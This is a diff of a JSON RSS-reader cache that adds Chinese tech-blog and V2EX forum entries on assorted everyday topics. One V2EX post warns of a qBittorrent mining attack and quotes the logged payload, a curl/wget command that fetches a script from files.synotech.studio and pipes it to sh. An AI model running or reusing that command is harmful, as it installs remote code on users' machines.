@@ -104,6 +104,12 @@
       ]
     },
     {
+      "title": "少数派",
+      "feedUrl": "https://rsshub.app/sspai/index",
+      "siteUrl": "https://sspai.com",
+      "articles": []
+    },
+    {
       "title": "潮流周刊",
       "feedUrl": "https://weekly.tw93.fun/rss.xml",
       "siteUrl": "https://weekly.tw93.fun/",
@@ -172,6 +178,16 @@
       "feedUrl": "https://feeds.feedburner.com/ruanyifeng",
       "siteUrl": "http://www.ruanyifeng.com/blog/",
       "articles": [
+        {
+          "id": "http://www.ruanyifeng.com/blog/2025/01/weekly-issue-334.html",
+          "author": null,
+          "description": "这里记录每周值得分享的科技内容，周五发布。\n本杂志开源，欢迎投稿。另有《谁在招人》服务，发布程序员招聘信息。合作请邮件联系（yifeng.ruan@gmail.com）。\n封面图\n\n武汉光谷是今年春节晚会的分会场，将表演灯光秀，非常有科幻感。（via）\n年终笔记四则\n下面是过去的笔记，我读到有意思的文章时，记录下来的感想，每一则都不长。\n前几天翻阅，觉得可以放在一起，重新发布，今天先发四则。\n一、工作也有利息\n银行存款有利息，存得越久，利息越多。\n工作也是一样，也有利息。如果今年的工作可以节省明年或未来的工作时间，就是一份有利息的工作。\n\n工作有利息，意味着你未来的工作时间会变少，多出来的时间，就可以去做别的事情，创造更多的价值。\n这提示我们：\n（1）不要轻易更换工作领域，否则以前积累的利息就作废了。只有在同一个工作领域，才可能产生长期积累，以前的工作为以后打基础，最终产生巨大的利息。\n（2）在职业生涯的早期，积累效果最好，最容易产生复利。开始积累越晚，产生复利就越少。\n（3）有些劳动没有积累效果，不会产生利息，比如重复性的机械劳动（快递、咖啡店员、门卫......），你明年还是要重复做这些事情。\n（4）最好的人生策略就是，找到你深感兴趣、可以长期做下去的领域，在上面投入大量的工作时间（包括质量和数量），然后随着年龄增长，享受以前工作的复利。\n二、巴菲特的选人标准\n巴菲特说，他考察候选人，就看三个\"i\"。\n\nintegrity（正直）\nintelligence（智慧）\ninitiative（主动）\n这三个\"i\"当中，\"主动\"最重要。\"正直\"和\"智慧\"的人到处都是，但如果不主动，不是自己想去做些什么，就什么也不会发生。\n三、快乐机\n1974年，一个美国哲学家提出一个假设，如果世界上有\"快乐机\"，只要插上电源，就能带来源源不断的快乐，并且无法分辨，这种机器快乐与现实世界的快乐有…",
+          "link": "http://www.ruanyifeng.com/blog/2025/01/weekly-issue-334.html",
+          "publishedOn": "2025-01-17T00:17:52.000Z",
+          "wordCount": null,
+          "title": "科技爱好者周刊（第 334 期）：年终笔记四则",
+          "imageUrl": null
+        },
         {
           "id": "http://www.ruanyifeng.com/blog/2025/01/tencent-cloud-copilot.html",
           "author": null,
@@ -292,6 +308,46 @@
       "siteUrl": "https://www.v2ex.com/",
       "articles": [
         {
+          "id": "https://www.v2ex.com/t/1105709",
+          "author": "Sanarara",
+          "description": "Sanarara: - 在昨天下班回家后，听见 nas 怪吵，看了下探针 CPU50%，检查进程，qbittorrent 进程极为活跃，但是没有正在下载的内容。平时一直用 rss 自动挂 sukebei ，确认过确实没有活跃任务，这就活见鬼了。\n- ssh 中 top 了一下，b3qmud4h 这个进程跑的飞起，怀疑有问题，互联网上搜索一圈，b3qmud4h 为自动生成的字段。\n- kill -9 该进程后，cpu 恢复正常，qb 服务也没出现问题\n- 重启 qbittorrent ，再次出现高 cpu 占用进程，同样为随机字符的任务。\n- 检查 qbittorrent 日志，发现  “运行外部程序。Torrent：“*********”。命令：`sh -c \"(curl -skL https://files.synotech.studio || wget --no-check-certificate -qO - https://files.synotech.studio) | sh\"`”\n- 通过搜索，得知设置→下载→运行外部程序 选项如果打勾的话，是可以通过种子直接运行脚本的\n- 大家务必检查一下这个设置是否开启，我的印象里是没有认为开启过，可能和包或者是 docker 镜像有关",
+          "link": "https://www.v2ex.com/t/1105709",
+          "publishedOn": "2025-01-17T00:28:47.000Z",
+          "wordCount": 1024,
+          "title": "要注意， qBittorrent 自动运行 torrent 传播的挖矿脚本",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.v2ex.com/t/1105708",
+          "author": "um6uih",
+          "description": "um6uih: 我装完 armbian 也运行了安装到 emmc 的命令，armbian-install ，也有进度，最后说成功了，让我拔出 u 盘，poweroff ，然后开机\n等开机就进安卓那个绿色的小人的恢复模式，试了三次了都是这样\n有没有大佬知道这是啥原因？",
+          "link": "https://www.v2ex.com/t/1105708",
+          "publishedOn": "2025-01-17T00:27:29.000Z",
+          "wordCount": 394,
+          "title": "n1 盒子 u 盘装完 armbian 为啥拔了 u 盘回进安卓系统的恢复模式啊？",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.v2ex.com/t/1105707",
+          "author": "roundRobin",
+          "description": "roundRobin: \n所有订单都减 20%，，这得多离谱才能让这个功能上线。不过在实名制下是不是都得算不当得利被追回？\nref: https://www.guancha.cn/politics/2025_01_16_762334.shtml",
+          "link": "https://www.v2ex.com/t/1105707",
+          "publishedOn": "2025-01-16T23:25:49.000Z",
+          "wordCount": 568,
+          "title": "支付宝这次的 Bug 有点严重啊",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.v2ex.com/t/1105706",
+          "author": "licong",
+          "description": "licong: 人在京都，大阪准备最后一天回去的时候去逛一下",
+          "link": "https://www.v2ex.com/t/1105706",
+          "publishedOn": "2025-01-16T22:40:12.000Z",
+          "wordCount": 433,
+          "title": "现在日本有什么好买的？",
+          "imageUrl": null
+        },
+        {
           "id": "https://www.v2ex.com/t/1105705",
           "author": "ly1878",
           "description": "ly1878: 如题，无论是在 FaceTime 中呼出普通手机电话，还是用 PopClip 快捷键或者是网页右键弹出的号码拨打，都拨打不成功，右上角会出现确认是否呼叫的界面，但是点了绿色的按钮后就没有任何变化。有时候点了按钮后会启动浏览器，也没有页面内容。\n通过手机拨打，再将信号传到 Mac 上，可以用 Mac 进行通话，但是直接在 Mac 上拨打就是不行\n想问下是我什么设置没处理好吗？还望大佬指点。",
@@ -307,7 +363,7 @@
           "description": "toptyloo: \nhttps://variety.com/2025/film/news/david-lynch-dead-director-blue-velvet-twin-peaks-1236276106/David Lynch\nhttps://www.facebook.com/davidlynchofficial/posts/pfbid04LuZED6SrWevszQ1UZoEED6x95znKc7scJxXFL5B1icBKgCiu4T2qYLHsErFNzELl",
           "link": "https://www.v2ex.com/t/1105704",
           "publishedOn": "2025-01-16T18:55:58.000Z",
-          "wordCount": 377,
+          "wordCount": 382,
           "title": "David Lynch 去世",
           "imageUrl": null
         },
@@ -317,7 +373,7 @@
           "description": "jsomin: \n支付宝官方发文：\n昨天下午由于我们的一个失误，导致小部分用户在支付时享受了立减优惠，有用户发了这个截图，关心我们会不会把优惠追回。\n有几个事实在此澄清：\n1 、支付宝官方没有发送任何资金追回短信，如果你收到了下图短信，千万不要点，以免上当受骗,也请大家帮忙相互转告。\n2 、失误是怎么发生的？其实是我们在支付宝某个常规营销活动后台配错了营销模板，把优惠额度和优惠金类型都写错了。\n3 、既然是我们的错，成本和责任必须我们自己承担。针对已经发出的营销优惠金，支付宝不会向用户追款，请大家安心。\n提前祝大家假期愉快~\n微博原文链接： https://weibo.com/1891502860/5123605060913184\nhttps://i.imgur.com/GAeYk7N.jpeg\nhttps://i.imgur.com/cPSb8II.jpeg",
           "link": "https://www.v2ex.com/t/1105703",
           "publishedOn": "2025-01-16T18:10:18.000Z",
-          "wordCount": 442,
+          "wordCount": 562,
           "title": "（支付宝事故后续）承诺不会向用户追款",
           "imageUrl": null
         },
@@ -337,7 +393,7 @@
           "description": "9yu: \n写了两篇文章：\nGoodbye Dystopia\nRETRO: 2024\n2024 年看了好几遍 Look Back：绘画没有捷径，人生也没有。",
           "link": "https://www.v2ex.com/t/1105701",
           "publishedOn": "2025-01-16T17:42:47.000Z",
-          "wordCount": 363,
+          "wordCount": 366,
           "title": "2024: 离开上海并在东京转职到 Woven by Toyota 写 Rust",
           "imageUrl": null
         },
@@ -347,7 +403,7 @@
           "description": "make1money: 我降智一个多月的 chrome 网页端，昨天开始恢复正常了，大伙都恢复正常了吗",
           "link": "https://www.v2ex.com/t/1105700",
           "publishedOn": "2025-01-16T17:31:09.000Z",
-          "wordCount": 349,
+          "wordCount": 351,
           "title": "现在网页端是不是不降智了？",
           "imageUrl": null
         },
@@ -357,7 +413,7 @@
           "description": "pig198x: \n美国 cn2 的 VPS ，奈何 IP 被 OpenAI 降智了，想套上一个 Cloudflare warp 用，在网上找了一键脚本，装上之后，IP 地址变 Cloudflare 了，但是速度奇慢无比，大概几十 k/s   有人知道这大概什么原因造成的吗？ 谢谢。",
           "link": "https://www.v2ex.com/t/1105699",
           "publishedOn": "2025-01-16T17:18:15.000Z",
-          "wordCount": 619,
+          "wordCount": 627,
           "title": "VPS 上套了 Cloudflare warp，速度狂慢，最有可能的状况是什么？",
           "imageUrl": null
         },
@@ -377,7 +433,7 @@
           "description": "myjun: \nTalkatone 注册教程\nhttps://youtu.be/rhVqpVWL004\nTalkatone 转移 Google Voice 实现永久保号\nhttps://youtu.be/v_kGDp02TZk",
           "link": "https://www.v2ex.com/t/1105696",
           "publishedOn": "2025-01-16T16:19:55.000Z",
-          "wordCount": 377,
+          "wordCount": 374,
           "title": "分享一下 Talkatone 注册和转移到 Google Voice 的过程",
           "imageUrl": null
         },
@@ -387,7 +443,7 @@
           "description": "razios: 带两娃 5 岁、9 岁。周六开始，周日下午 2 点回。",
           "link": "https://www.v2ex.com/t/1105693",
           "publishedOn": "2025-01-16T15:29:56.000Z",
-          "wordCount": 342,
+          "wordCount": 350,
           "title": "上海周末两天哪里好玩？",
           "imageUrl": null
         },
@@ -407,7 +463,7 @@
           "description": "trumandu: \n当一年将尽，你是否也会不由自主地回顾这一年的点点滴滴？展望新年时，你又是否会感到迷茫，不知道该如何设定更贴近自己内心的目标？邀请你一同开启一段独特的旅程，透过一个神奇的网页地址—— [ 2024 年度独立博客年终总结随机浏览] ，穿越到他人的世界，在文字中感受温度，在共鸣中发现自己。\n这是一个怎样的网页？\nhttps://trumandu.top/2024-summary\n\n这个网页汇集了 2024 年度独立博客作者们撰写的年终总结文章。这些文章真实而生动，每一篇都是一个人独一无二的故事。无论是他们在这一年中取得的成就、面对的挑战，还是他们所见所闻的点滴，这里都将一一呈现。而最特别之处在于，这个网页采用随机查看的方式，每次刷新页面，你都将进入一位新博主的世界，与陌生的灵魂共鸣。\n为什么要浏览他人的年终总结？\n共情的力量\n年终总结中总有触动人心的瞬间。可能是一位博主分享的创业成功之路让你燃起斗志，也可能是一段失落的回忆让你反思生命中的遗憾。无论是喜悦还是痛苦，你都可以从中找到共鸣。\n激发灵感\n他人的经历，往往是自己无法企及的视角。有人用一年的时间环游世界，有人辞去工作追寻热爱，还有人深耕某个领域取得突破。每一个故事，都是一种可能。\n为新年提供指引\n当你浏览了足够多的文章，沉浸在他人总结与思考中，你会发现：某些目标和路径可能也适用于自己，为 2025 年的规划提供参考和灵感。\n如何使用这个网页？\n简单三步：\n1.打开网址（点击 这里 进入）。\n2.随机跳转到一篇 2024 年度总结博客文章。\n3.畅游博主的世界，寻找与自己心灵契合的故事。\n每一次点击都是未知的冒险，每一次阅读都是一次内心的震动。\n适合哪些人？\n•迷茫的你：如果你正处在人生的十字路口，不知未来何去何从，这里或许能帮你找到方向。\n•希望借鉴经验的你：职场、创业、学术、生活，每个领域的总结都可能让你茅塞顿开。\n•热爱故事的你：感受千百种人生，从别人的笔触中体验不同的世界。\n•寻找共鸣的你：当下的你或许孤独，但这些文字会告诉你，你并不孤单。\n未来，从共鸣开始\n在这里，每一次随机都是与人心的一次对话，每一次阅读都是对自我的一次探索。2024 年即将过去，但它的故事仍在延续。感受这片文字的温度吧！",
           "link": "https://www.v2ex.com/t/1105691",
           "publishedOn": "2025-01-16T15:26:00.000Z",
-          "wordCount": 414,
+          "wordCount": 452,
           "title": "做了一个 2024 年度独立博客年终总结随机浏览网站——发现他人的精彩，找到自己的方向",
           "imageUrl": null
         },
@@ -437,7 +493,7 @@
           "description": "maymay5: \n我的应用场景：作为我系统的一个依赖，用于存储用户使用系统过程中产生的图片\n要求\n必须支持 API 调用上传和下载以及删除\n轻量一点\n最好能支持 COS ，OBS ，OSS 等对象存储(这个功能可以是付费的)\n如果不止图片，能支持文件床就更好了\n为什么不直接用对象存储？\n说不出为啥，就觉得单独弄一个系统比较正式，方便管理\n谢谢大家！！",
           "link": "https://www.v2ex.com/t/1105688",
           "publishedOn": "2025-01-16T15:02:38.000Z",
-          "wordCount": 394,
+          "wordCount": 417,
           "title": "请问大家有推荐的开源图床吗",
           "imageUrl": null
         },
@@ -477,7 +533,7 @@
           "description": "zhj9709: A B 可以直连，B C 可以直连，为什么 A C 不能通过 B 中转连接，而是要通过 derp 服务器？",
           "link": "https://www.v2ex.com/t/1105682",
           "publishedOn": "2025-01-16T14:18:37.000Z",
-          "wordCount": 532,
+          "wordCount": 583,
           "title": "关于 tailscale 的一些疑问",
           "imageUrl": null
         },
@@ -507,7 +563,7 @@
           "description": "kirieievk: \n否则还要跑一趟麻烦. 为啥规定只能 90 天以内.",
           "link": "https://www.v2ex.com/t/1105678",
           "publishedOn": "2025-01-16T13:48:12.000Z",
-          "wordCount": 441,
+          "wordCount": 480,
           "title": "驾照只能提前 90 天更新吗,春节回去想更新,但是还没到 90 天",
           "imageUrl": null
         },
@@ -517,7 +573,7 @@
           "description": "heavymetals: \nNintendo Switch 2 予告映像\n老任也是坐不住了...不知道首发游戏是不是跟泄漏的一样是马车 9 和荒野大镖客。\n希望性能能好一点\n任天堂 Switch 新款总结要点\n向下兼容任天堂 Switch 1 代游戏。\n外观与任天堂 Switch OLED 类似，屏幕由 7 寸扩大到 8 寸，分辨率由 720p 提升到 1080p 。机身变大，厚度没什么变化，依旧轻薄。\n散热采用双风扇设计。\n机身上方加了一个 USB-C 接口。\n新款 Joy-Con 手柄随机身变大而变大，滑轨锁扣改为磁吸卡扣。摇杆和按钮更大，背部多了 2 个按钮。\n2025 年发售。\n2025 年 4 月 2 日有直面会公布更多细节。\n来源：点击这里查看链接",
           "link": "https://www.v2ex.com/t/1105677",
           "publishedOn": "2025-01-16T13:36:55.000Z",
-          "wordCount": 512,
+          "wordCount": 540,
           "title": "任天堂发布 Switch 2 预告片，并宣布于 2025.4.2 展开直面会",
           "imageUrl": null
         },
@@ -527,7 +583,7 @@
           "description": "awendujitang: 大家有没有让人上头的小游戏，简单而且让人上瘾，可以告诉我吗？让我玩一下。😝",
           "link": "https://www.v2ex.com/t/1105675",
           "publishedOn": "2025-01-16T13:21:01.000Z",
-          "wordCount": 494,
+          "wordCount": 582,
           "title": "大家有没有让人上头的小游戏，简单而且让人上瘾",
           "imageUrl": null
         },
@@ -537,7 +593,7 @@
           "description": "drymonfidelia:",
           "link": "https://www.v2ex.com/t/1105674",
           "publishedOn": "2025-01-16T13:14:11.000Z",
-          "wordCount": 507,
+          "wordCount": 512,
           "title": "如果抽卡游戏用的不是密码学安全的随机数算法（我觉得大部分游戏都不是），是不是有可能从客户端控制服务器的随机抽卡结果？",
           "imageUrl": null
         },
@@ -557,7 +613,7 @@
           "description": "QwertyJack: \nEnglishDaily，是一款免费的日常英语训练平台，不仅有每日更新的高质量外语素材，还有听力模拟测试题，以及 AI 语法检查写作工具，欢迎大家使用&建议。\n为什么做这个网站？\n目前楼主在外企工作，一开始做这个站纯属为了满足自己的需求，主要用于日常工作沟通，而不是应付考试，通过和一些国外的同事请教如何才能学好英语，他们给出的意见是：敢于表达+每日坚持，并且十分不建议国内的背单词+纯语法背诵的学习方式，而是更倾向多听、多看、多说，多写，然后我找了很多相关网站，要不收费、要不就是内容质量不高，无法满足我每天 1 小时的训练要求，所以，被迫做了这个网站，成本不算大，就开放大家一起用吧。\n网站地址： https://englishdaily.ai ， 欢迎大家使用和给出建议，主打一个听劝，站内也有反馈入口。",
           "link": "https://www.v2ex.com/t/1105672",
           "publishedOn": "2025-01-16T13:00:51.000Z",
-          "wordCount": 421,
+          "wordCount": 433,
           "title": "EnglishDaily 一款免费的每日英语学习网站",
           "imageUrl": null
         },
@@ -567,7 +623,7 @@
           "description": "iamperiod331www:",
           "link": "https://www.v2ex.com/t/1105670",
           "publishedOn": "2025-01-16T12:53:04.000Z",
-          "wordCount": 344,
+          "wordCount": 360,
           "title": "拼多多竟然还有这种东西，建议在农村过年的买个玩玩，我先买为敬",
           "imageUrl": null
         },
@@ -627,7 +683,7 @@
           "description": "SachinBeyond: 彩礼都带回去了,还另外有不少嫁妆, 钱和女人都拿了 .可遇不可求吧?",
           "link": "https://www.v2ex.com/t/1105661",
           "publishedOn": "2025-01-16T11:45:13.000Z",
-          "wordCount": 452,
+          "wordCount": 532,
           "title": "有多少人是 彩礼一分不留,还另外带嫁妆(钱)的?",
           "imageUrl": null
         },
@@ -637,38 +693,8 @@
           "description": "IMZQZ: \n现在是有线的 桌子上充电线、耳机线、扩展坞、键盘线，太乱了\n想先买个无线或者蓝牙的耳机，然后换个蓝牙键鼠。\n这样就清爽一些了\n谢谢大家的推荐！性价比高点最好 越便宜越好 就是上班摸鱼听小说用",
           "link": "https://www.v2ex.com/t/1105660",
           "publishedOn": "2025-01-16T11:40:47.000Z",
-          "wordCount": 417,
+          "wordCount": 424,
           "title": "求推荐个 MacBook 用的无线或者蓝牙耳机",
-          "imageUrl": null
-        },
-        {
-          "id": "https://www.v2ex.com/t/1105658",
-          "author": "qqqtz",
-          "description": "qqqtz: 追加贷（纯信用）\n额度:10 － 50 万\n还款方式:等额，先息\n年限:等额 8 年，先息 3 － 5 年\n月利息:1.63 厘（ 10 万元一个月利息 163 元）",
-          "link": "https://www.v2ex.com/t/1105658",
-          "publishedOn": "2025-01-16T11:38:35.000Z",
-          "wordCount": 445,
-          "title": "工行追加贷有什么坑",
-          "imageUrl": null
-        },
-        {
-          "id": "https://www.v2ex.com/t/1105657",
-          "author": "wsping",
-          "description": "wsping: \n京东预约了下，随便就买到了。",
-          "link": "https://www.v2ex.com/t/1105657",
-          "publishedOn": "2025-01-16T11:37:39.000Z",
-          "wordCount": 390,
-          "title": "3599 的 Mac mini 4 丐版好像很容易买到？",
-          "imageUrl": null
-        },
-        {
-          "id": "https://www.v2ex.com/t/1105656",
-          "author": "ocsp",
-          "description": "ocsp: 位置深圳，前天刚上门刷过身份证查过房，今天换个人来又敲门，不要太搞笑。。",
-          "link": "https://www.v2ex.com/t/1105656",
-          "publishedOn": "2025-01-16T11:25:42.000Z",
-          "wordCount": 398,
-          "title": "网格员们开始查房扰民了",
           "imageUrl": null
         }
       ]
